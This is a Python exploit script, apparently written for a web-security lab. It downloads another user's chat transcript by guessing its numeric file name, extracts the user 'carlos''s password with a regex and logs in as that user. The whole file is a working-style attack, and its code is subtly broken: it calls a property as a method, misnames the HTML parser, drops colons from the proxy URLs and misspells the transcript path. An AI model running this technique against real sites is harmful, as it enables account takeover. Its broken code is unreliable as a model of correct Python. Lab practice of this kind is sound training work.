import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def get_csrf_token(s, url):
    r= s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html-parser')
    csrf =soup.find("input",{'name':'csrf'})['value']
    return csrf

def carlos_login(s, url, password):
    #get CSRF token from login page 
    login_url = url + '/login'
    csrf_token = get_csrf_token(s, login_url) 
    #Rest of the code here 
    #Logging in as the user administrator 
    print("(+) Logging in as the user carlos...")
    login_data = {'csrf': csrf_token, 'username':'carlos', 'password':password}
    r = s.post(login_url, data=login_data , verify=False, proxies=proxies)
    res= r.text()
    if 'Log out' in res:
        print('(+) Successfully Logged in as user carlos ')   
    else: 
        print('(+) Failure to log in as user carlos')
        sys.exit(-1)

def retrieve_carlos_password(s, url):
    chat_url = url + "/download-transcipt/1.txt"
    r = s.get(chat_url, verify=False, proxies=proxies)
    res = r.text()
    if 'password' in res:
        print("(+) Found the password for carlos user")
        carlos_password = re.findall(r'password is (.*)\.', res)
        return carlos_password[0]
    else:
        print("(+)Could not find the carlos user's password")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv [0])
        print(" (+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.session()
    url = sys.argv[1]
    carlos_password = retrieve_carlos_password(s, url)
    
    carlos_login(s, url, carlos_password)
    
if __name__ == '__main__':
    main()